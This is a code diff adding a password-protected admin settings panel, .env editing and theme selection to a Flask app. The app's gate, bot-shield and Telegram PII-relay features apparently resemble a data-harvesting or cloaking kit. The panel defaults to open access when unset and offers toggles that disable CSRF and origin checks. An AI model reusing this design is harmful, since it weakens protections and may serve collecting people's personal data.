@@ -13,6 +13,9 @@ from pathlib import Path
 
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 FRONTEND_DIR = PROJECT_ROOT / "frontend"
+ENV_FILE_PATH = PROJECT_ROOT / ".env"
+THEME_REGISTRY_PATH = PROJECT_ROOT / "config" / "prebuilt_themes.json"
+DATA_DIR = PROJECT_ROOT / "data"
 
 from dotenv import load_dotenv
 
@@ -34,12 +37,15 @@ from flask import (
     Flask,
     abort,
     make_response,
+    redirect,
     render_template,
     request,
     session,
+    url_for,
 )
 
 from backend import (
+    admin_env,
     bango_hardening,
     checksum,
     gate_engine,
@@ -49,6 +55,7 @@ from backend import (
     lab_shield,
     rsa_envelope,
     telegram_notify,
+    theme_registry,
     ua_parse,
 )
 from backend.json_random_response import make_randomized_json_response
@@ -70,6 +77,7 @@ SESSION_UI_XOR_KEY = "ui_xor_key"
 SESSION_CLIENT_UA = "client_ua_snapshot"
 SESSION_BANGO_CSP = "bango_csp"
 SESSION_BANGO_JS = "bango_js"
+SESSION_ADMIN_AUTH = "admin_panel_authenticated"
 
 _rate_store: dict[str, list[float]] = {}
 
@@ -587,6 +595,53 @@ def _spawn_telegram_after_register(
     threading.Thread(target=_work, daemon=True).start()
 
 
+def _admin_password_live() -> str:
+    val = admin_env.read_env_values(ENV_FILE_PATH, keys={"ADMIN_PANEL_PASSWORD"}).get(
+        "ADMIN_PANEL_PASSWORD", ""
+    )
+    return (val or "").strip()
+
+
+def _admin_access_mode_live() -> str:
+    val = admin_env.read_env_values(ENV_FILE_PATH, keys={"ADMIN_PANEL_ACCESS_MODE"}).get(
+        "ADMIN_PANEL_ACCESS_MODE", ""
+    )
+    mode = (val or "").strip().lower()
+    return mode if mode in {"open", "restricted"} else "open"
+
+
+def _admin_ip_whitelist_live() -> set[str]:
+    raw = admin_env.read_env_values(ENV_FILE_PATH, keys={"ADMIN_PANEL_IP_WHITELIST"}).get(
+        "ADMIN_PANEL_IP_WHITELIST", ""
+    )
+    items = re.split(r"[,\s]+", raw or "")
+    return {it.strip() for it in items if it.strip()}
+
+
+def _admin_access_allowed() -> bool:
+    if _admin_access_mode_live() != "restricted":
+        return True
+    return _client_ip_for_lab() in _admin_ip_whitelist_live()
+
+
+def _admin_theme_id_live() -> str:
+    themes = theme_registry.load_themes(THEME_REGISTRY_PATH)
+    env_theme = admin_env.read_env_values(ENV_FILE_PATH, keys={"ACTIVE_THEME"}).get(
+        "ACTIVE_THEME", ""
+    )
+    requested = (env_theme or "").strip()
+    if requested in themes:
+        return requested
+    return "default" if "default" in themes else next(iter(themes.keys()))
+
+
+def _admin_log(event: str, payload: dict[str, object]) -> None:
+    try:
+        admin_env.append_admin_audit_log(DATA_DIR, event=event, payload=payload)
+    except Exception:
+        pass
+
+
 def create_app() -> Flask:
     """
     Application factory wiring routes to **gate_engine**, **checksum**, and SQLite.
@@ -868,8 +923,16 @@ def create_app() -> Flask:
         return _serve_core_shell_app(seg1, seg2, "bango.html")
 
     def _bango_response_html() -> object:
+        themes = theme_registry.load_themes(THEME_REGISTRY_PATH)
+        active_theme = _admin_theme_id_live()
+        theme_meta = themes.get(active_theme) or themes.get("default") or {"template": "bango.html"}
+        template_name = str(theme_meta.get("template") or "bango.html")
         resp = make_response(
-            render_template("bango.html"),
+            render_template(
+                template_name,
+                active_theme_id=active_theme,
+                active_theme_label=str(theme_meta.get("label") or active_theme),
+            ),
             200,
             {"Content-Type": "text/html; charset=utf-8"},
         )
@@ -1280,6 +1343,116 @@ def create_app() -> Flask:
                 "done_check_seconds": _bango_done_redirect_delay_sec(),
             },
             200,
+        )
+
+    @app.route("/admin/login", methods=["GET", "POST"])
+    def admin_login():
+        if not _admin_access_allowed():
+            _admin_log(
+                "admin_access_denied",
+                {"ip": _client_ip_for_lab(), "mode": _admin_access_mode_live()},
+            )
+            return ("Admin access denied for this IP.", 403)
+
+        error = ""
+        configured_pw = _admin_password_live()
+        if request.method == "POST":
+            provided = (request.form.get("password") or "").strip()
+            if not configured_pw:
+                error = "ADMIN_PANEL_PASSWORD is not configured in .env."
+            elif provided and hmac.compare_digest(provided, configured_pw):
+                session[SESSION_ADMIN_AUTH] = True
+                _admin_log("admin_login_success", {"ip": _client_ip_for_lab()})
+                return redirect(url_for("admin_settings"))
+            else:
+                error = "Invalid password."
+                _admin_log("admin_login_failed", {"ip": _client_ip_for_lab()})
+        return render_template(
+            "admin_login.html",
+            error=error,
+            has_password=bool(configured_pw),
+            access_mode=_admin_access_mode_live(),
+        )
+
+    @app.post("/admin/logout")
+    def admin_logout():
+        session.pop(SESSION_ADMIN_AUTH, None)
+        return redirect(url_for("admin_login"))
+
+    @app.route("/admin/settings", methods=["GET", "POST"])
+    def admin_settings():
+        if not session.get(SESSION_ADMIN_AUTH):
+            return redirect(url_for("admin_login"))
+        if not _admin_access_allowed():
+            session.pop(SESSION_ADMIN_AUTH, None)
+            return ("Admin access denied for this IP.", 403)
+
+        notice = ""
+        error = ""
+        saved_keys: list[str] = []
+        bool_keys = {
+            "COOKIE_SECURE",
+            "STRICT_ORIGIN",
+            "GATE_CSRF_DISABLED",
+            "HANDSHAKE_DISABLED",
+            "API_CSRF_DISABLED",
+            "INCOGNITO_BLOCK",
+            "EXTERNAL_GUARD_FAIL_OPEN",
+            "TELEGRAM_PII_PLAINTEXT",
+        }
+
+        current_values = admin_env.read_env_values(ENV_FILE_PATH)
+        themes = theme_registry.load_themes(THEME_REGISTRY_PATH)
+
+        if request.method == "POST":
+            action = (request.form.get("action") or "").strip().lower()
+            updates: dict[str, str] = {}
+            for key in sorted(admin_env.all_allowlisted_keys()):
+                if key in bool_keys:
+                    updates[key] = "1" if request.form.get(key) else ""
+                    continue
+                if key not in request.form:
+                    continue
+                incoming = (request.form.get(key) or "").strip()
+                if key in admin_env.SENSITIVE_KEYS and incoming == "":
+                    continue
+                updates[key] = incoming
+            if "ACTIVE_THEME" in updates and updates["ACTIVE_THEME"] not in themes:
+                error = "Selected theme is not in registry."
+            else:
+                try:
+                    saved_keys = admin_env.write_env_values_atomic(ENV_FILE_PATH, updates)
+                    _admin_log(
+                        "admin_settings_saved",
+                        {
+                            "ip": _client_ip_for_lab(),
+                            "saved_keys": saved_keys,
+                            "theme": updates.get("ACTIVE_THEME", current_values.get("ACTIVE_THEME", "")),
+                            "action": action or "save",
+                        },
+                    )
+                    if action == "apply":
+                        notice = (
+                            "Changes were saved to .env. Apply requires manual redeploy in Coolify."
+                        )
+                    else:
+                        notice = "Settings saved to .env."
+                    current_values = admin_env.read_env_values(ENV_FILE_PATH)
+                except Exception as exc:
+                    error = str(exc)
+
+        grouped = admin_env.values_by_group(current_values)
+        active_theme = _admin_theme_id_live()
+        return render_template(
+            "admin_settings.html",
+            notice=notice,
+            error=error,
+            grouped=grouped,
+            themes=themes,
+            active_theme=active_theme,
+            bool_keys=bool_keys,
+            saved_keys=saved_keys,
+            access_mode=_admin_access_mode_live(),
         )
 
     @app.get("/")
